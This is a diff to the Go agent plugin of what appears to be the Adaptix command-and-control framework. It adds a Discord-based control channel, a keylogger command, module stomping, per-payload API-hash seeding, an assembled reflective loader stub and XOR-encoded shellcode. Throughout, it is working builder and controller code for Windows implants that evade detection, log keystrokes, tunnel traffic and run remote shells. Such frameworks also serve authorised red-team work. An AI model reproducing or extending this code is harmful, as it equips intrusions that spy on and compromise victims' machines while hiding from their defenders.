@@ -31,7 +31,7 @@ type Teamserver interface {
 	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
 	TsAgentBuildLog(builderId string, status int, message string) error
 
-	TsAgentConsoleOutput(agentId string, client string, messageType int, message string, clearText string, store bool)
+	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
 
 	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
 	TsGetPivotInfoByName(pivotName string) (string, string, string)
@@ -107,8 +107,8 @@ func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
 	return &ExtenderAgent{}
 }
 
-func makeProxyTask(packData []byte, priority uint) adaptix.TaskData {
-	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Priority: priority, Sync: false}
+func makeProxyTask(packData []byte) adaptix.TaskData {
+	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
 }
 
 func getStringArg(args map[string]any, key string) (string, error) {
@@ -153,7 +153,7 @@ func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, add
 	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, tunnelType, address, port}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
@@ -162,7 +162,7 @@ func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, add
 	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
@@ -171,7 +171,7 @@ func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_DATA)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
@@ -180,7 +180,7 @@ func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_DATA)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessagePause(channelId int) adaptix.TaskData {
@@ -189,7 +189,7 @@ func TunnelMessagePause(channelId int) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_PAUSE, channelId}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageResume(channelId int) adaptix.TaskData {
@@ -198,7 +198,7 @@ func TunnelMessageResume(channelId int) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_RESUME, channelId}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageClose(channelId int) adaptix.TaskData {
@@ -207,7 +207,7 @@ func TunnelMessageClose(channelId int) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CLOSE)
+	return makeProxyTask(packData)
 }
 
 func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
@@ -216,7 +216,7 @@ func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
 	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 /// TERMINAL
@@ -236,7 +236,7 @@ func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, 
 	array := []interface{}{COMMAND_SHELL_START, terminalId, programArgs}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CREATE)
+	return makeProxyTask(packData)
 }
 
 func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
@@ -249,7 +249,7 @@ func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskDa
 	array := []interface{}{COMMAND_SHELL_WRITE, terminalId, len(dataEncode), []byte(dataEncode)}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_DATA)
+	return makeProxyTask(packData)
 }
 
 func TerminalMessageClose(terminalId int) adaptix.TaskData {
@@ -258,7 +258,7 @@ func TerminalMessageClose(terminalId int) adaptix.TaskData {
 	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
 	packData, _ = PackArray(array)
 	/// END CODE HERE
-	return makeProxyTask(packData, PRIORITY_TUNNEL_CLOSE)
+	return makeProxyTask(packData)
 }
 
 ////// PLUGIN AGENT
@@ -290,17 +290,29 @@ type GenerateConfig struct {
 	ProxyUsername      string `json:"proxy_username"`
 	ProxyPassword      string `json:"proxy_password"`
 	RotationMode       string `json:"rotation_mode"`
+	ModuleStomp        bool   `json:"module_stomp"`
+	StompPaths         string `json:"stomp_paths"`
 }
 
 var (
-	ObjectDir_http = "objects_http"
-	ObjectDir_smb  = "objects_smb"
-	ObjectDir_tcp  = "objects_tcp"
-	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectDir_http    = "objects_http"
+	ObjectDir_smb     = "objects_smb"
+	ObjectDir_tcp     = "objects_tcp"
+	ObjectDir_dns     = "objects_dns"
+	ObjectDir_discord = "objects_discord"
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "Keylogger", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
-	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ -mwindows"
+	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
+
+var seedDependentFiles = map[string]bool{
+	"ProcLoader": true,
+	"ApiLoader":  true,
+	"Boffer":     true,
+	"bof_loader": true,
+	"Commander":  true,
+	"Keylogger":  true,
+}
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
 	var agentProfiles [][]byte
@@ -360,6 +372,9 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		encryptKey, err := hex.DecodeString(encrypt_key)
 		if err != nil {
 			return nil, err
+		}
+		if len(encryptKey) != 32 {
+			return nil, errors.New("encrypt_key must be 32 bytes (64 hex chars) for AES-256-GCM")
 		}
 
 		params = append(params, int(agentWatermark))
@@ -495,6 +510,19 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				return nil, err
 			}
 
+		case "discord":
+			webhookUrl, _ := listenerMap["webhook_url"].(string)
+			botToken, _ := listenerMap["bot_token"].(string)
+			channelTasksId, _ := listenerMap["channel_tasks_id"].(string)
+			pollInterval, _ := listenerMap["poll_interval"].(float64)
+			cleanup, _ := listenerMap["cleanup"].(bool)
+
+			params = append(params, webhookUrl)
+			params = append(params, botToken)
+			params = append(params, channelTasksId)
+			params = append(params, int(pollInterval))
+			params = append(params, cleanup)
+
 		default:
 			return nil, errors.New("protocol unknown")
 		}
@@ -504,7 +532,7 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			return nil, err
 		}
 
-		cryptParams, err := RC4Crypt(packedParams, encryptKey)
+		cryptParams, err := AES256GCMEncrypt(packedParams, encryptKey)
 		if err != nil {
 			return nil, err
 		}
@@ -577,6 +605,15 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 
+	seed := cryptoRandUint32()
+	err = os.WriteFile(currentDir+"/beacon/ApiDefines.h", []byte(generateApiDefines(seed)), 0644)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+	cFlags += fmt.Sprintf(" -DDJB2_SEED=%dU", seed)
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x", seed))
+
 	protocol, _ := listenerMap["protocol"].(string)
 	if protocol == "http" {
 		ObjectDir = ObjectDir_http
@@ -590,6 +627,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	} else if protocol == "dns" {
 		ObjectDir = ObjectDir_dns
 		ConnectorFile = "ConnectorDNS"
+	} else if protocol == "discord" {
+		ObjectDir = ObjectDir_discord
+		ConnectorFile = "ConnectorDiscord"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -629,13 +669,60 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")
 
-	Files := tempDir + "/config.o "
-	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
-	for _, ofile := range ObjectFiles {
-		Files += ObjectDir + "/" + ofile + Ext + " "
+	beaconDefine := ""
+	switch protocol {
+	case "http":
+		beaconDefine = "-DBEACON_HTTP"
+	case "bind_smb":
+		beaconDefine = "-DBEACON_SMB"
+	case "bind_tcp":
+		beaconDefine = "-DBEACON_TCP"
+	case "dns":
+		beaconDefine = "-DBEACON_DNS"
+	case "discord":
+		beaconDefine = "-DBEACON_DISCORD"
+	}
+
+	recompileFiles := []string{ConnectorFile}
+	for name := range seedDependentFiles {
+		recompileFiles = append(recompileFiles, name)
 	}
 	if protocol == "dns" {
-		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
+		recompileFiles = append(recompileFiles, "DnsCodec")
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Recompiling hash-dependent files with per-payload seed...")
+	for _, srcFile := range recompileFiles {
+		srcPath := "beacon/" + srcFile + ".cpp"
+		outPath := tempDir + "/" + srcFile + Ext
+		cmdRecomp := fmt.Sprintf("%s %s %s %s -o %s", Compiler, cFlags, beaconDefine, srcPath, outPath)
+		var recompArgs []string
+		recompArgs = append(recompArgs, "-c", cmdRecomp)
+		err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", recompArgs...)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Hash-dependent files recompiled")
+
+	recompiledSet := make(map[string]bool)
+	for _, f := range recompileFiles {
+		recompiledSet[f] = true
+	}
+
+	Files := tempDir + "/config.o "
+	Files += tempDir + "/" + ConnectorFile + Ext + " "
+	for _, ofile := range ObjectFiles {
+		if recompiledSet[ofile] {
+			Files += tempDir + "/" + ofile + Ext + " "
+		} else {
+			Files += ObjectDir + "/" + ofile + Ext + " "
+		}
+	}
+	if protocol == "dns" {
+		Files += tempDir + "/DnsCodec" + Ext + " "
+		Files += ObjectDir + "/miniz" + Ext + " "
 	}
 
 	if generateConfig.Format == "Exe" {
@@ -722,17 +809,85 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if err != nil {
 		return nil, "", err
 	}
-	_ = os.RemoveAll(tempDir)
 
 	if generateConfig.Format == "Shellcode" {
-		stubContent, err := os.ReadFile(stubPath)
-		if err != nil {
-			return nil, "", err
+		if generateConfig.Arch == "x64" {
+			stubHashes := computeStubHashes(seed)
+			nasmSrc := "files/stub_rdi.x64.asm"
+			stubBinPath := tempDir + "/stub.x64.bin"
+			nasmDefines := fmt.Sprintf("-DDJB2_SEED=%d -DHASH_MOD_NTDLL=0x%x -DHASH_MOD_KERNEL32=0x%x "+
+				"-DHASH_NTCREATESECTION=0x%x -DHASH_NTMAPVIEWOFSECTION=0x%x "+
+				"-DHASH_NTPROTECTVIRTUALMEMORY=0x%x -DHASH_NTCLOSE=0x%x "+
+				"-DHASH_LOADLIBRARYA=0x%x -DHASH_GETPROCADDRESS=0x%x "+
+				"-DHASH_FLUSHINSTRUCTIONCACHE=0x%x -DHASH_FREELIBRARY=0x%x "+
+				"-DHASH_LOADLIBRARYEXA=0x%x",
+				seed,
+				stubHashes.ModNtdll, stubHashes.ModKernel32,
+				stubHashes.NtCreateSection, stubHashes.NtMapViewOfSection,
+				stubHashes.NtProtectVirtualMem, stubHashes.NtClose,
+				stubHashes.LoadLibraryA, stubHashes.GetProcAddress,
+				stubHashes.FlushInstructionCache, stubHashes.FreeLibrary,
+				stubHashes.LoadLibraryExA)
+
+			if generateConfig.ModuleStomp && generateConfig.StompPaths != "" {
+				incPath := tempDir + "/stomp_paths.inc"
+				var incContent strings.Builder
+				incContent.WriteString("_stomp_paths:\n")
+				for _, line := range strings.Split(generateConfig.StompPaths, "\n") {
+					path := strings.TrimSpace(line)
+					if path == "" {
+						continue
+					}
+					escaped := strings.ReplaceAll(path, `\`, `\\`)
+					incContent.WriteString(fmt.Sprintf("    db \"%s\", 0\n", escaped))
+				}
+				incContent.WriteString("    db 0\n")
+				_ = os.WriteFile(incPath, []byte(incContent.String()), 0644)
+				nasmDefines += fmt.Sprintf(" -DMODULE_STOMP -I%s/", tempDir)
+				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Module stomping enabled")
+			}
+
+			nasmCmd := fmt.Sprintf("nasm -f bin %s %s -o %s", nasmDefines, nasmSrc, stubBinPath)
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Assembling reflective loader stub with per-payload hashes...")
+			var nasmArgs []string
+			nasmArgs = append(nasmArgs, "-c", nasmCmd)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", nasmArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			stubContent, err := os.ReadFile(stubBinPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			rawShellcode := append(stubContent, buildContent...)
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stub: %d bytes, raw shellcode: %d bytes", len(stubContent), len(rawShellcode)))
+
+			Payload, err = xorEncodeShellcode(rawShellcode, "x64")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("XOR-encoded shellcode: %d bytes", len(Payload)))
+		} else {
+			stubContent, err := os.ReadFile(stubPath)
+			if err != nil {
+				return nil, "", err
+			}
+			rawShellcode := append(stubContent, buildContent...)
+
+			Payload, err = xorEncodeShellcode(rawShellcode, "x86")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("XOR-encoded shellcode: %d bytes", len(Payload)))
 		}
-		Payload = append(stubContent, buildContent...)
 	} else {
 		Payload = buildContent
 	}
+	_ = os.RemoveAll(tempDir)
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
 	/// END CODE HERE
@@ -805,13 +960,13 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 
 func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
 	/// START CODE
-	return RC4Crypt(data, key)
+	return AES256GCMEncrypt(data, key)
 	/// END CODE
 }
 
 func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
 	/// START CODE
-	return RC4Crypt(data, key)
+	return AES256GCMDecrypt(data, key)
 	/// END CODE
 }
 
@@ -1485,6 +1640,11 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 		array = []interface{}{COMMAND_UNLINK, int(id)}
 
+	case "keylog":
+		taskData.Type = adaptix.TASK_TYPE_JOB
+		pollInterval := 100
+		array = []interface{}{COMMAND_KEYLOG_START, pollInterval}
+
 	case "upload":
 		var fileName string
 		var localFile string
@@ -1513,7 +1673,6 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 	}
 
 	taskData.Data, err = PackArray(array)
-	taskData.Priority = PRIORITY_TASK
 
 	/// END CODE
 
@@ -1856,6 +2015,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 			task.Message = message
 
+		case COMMAND_KEYLOG_START:
+			task.Type = adaptix.TASK_TYPE_JOB
+			task.Completed = false
+			task.Message = "Keylogger started (use 'jobs kill' to stop)"
+
 		case COMMAND_JOB:
 			if false == packer.CheckPacker([]string{"byte", "byte"}) {
 				goto HANDLER
@@ -1974,10 +2138,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 			if linkType == 1 {
 				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			} else if linkType == 2 {
 				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			}
 
 		case COMMAND_LS:
@@ -2325,9 +2489,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 		case COMMAND_REV2SELF:
 			task.Message = "Token reverted successfully"
+			emptyImpersonate := ""
 			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
 				Impersonated *string `json:"impersonated"`
-			}{Impersonated: new("")})
+			}{Impersonated: &emptyImpersonate})
 
 		case COMMAND_RM:
 			if false == packer.CheckPacker([]string{"byte"}) {
@@ -2453,11 +2618,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			if pivotType != 0 {
 				_ = Ts.TsPivotDelete(pivotId)
 				if TaskId == 0 {
-					Ts.TsAgentConsoleOutput(parentAgentId, "", adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
+					Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
 				} else {
 					task.Message = messageParent
 				}
-				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
 			}
 
 		case COMMAND_UPLOAD:
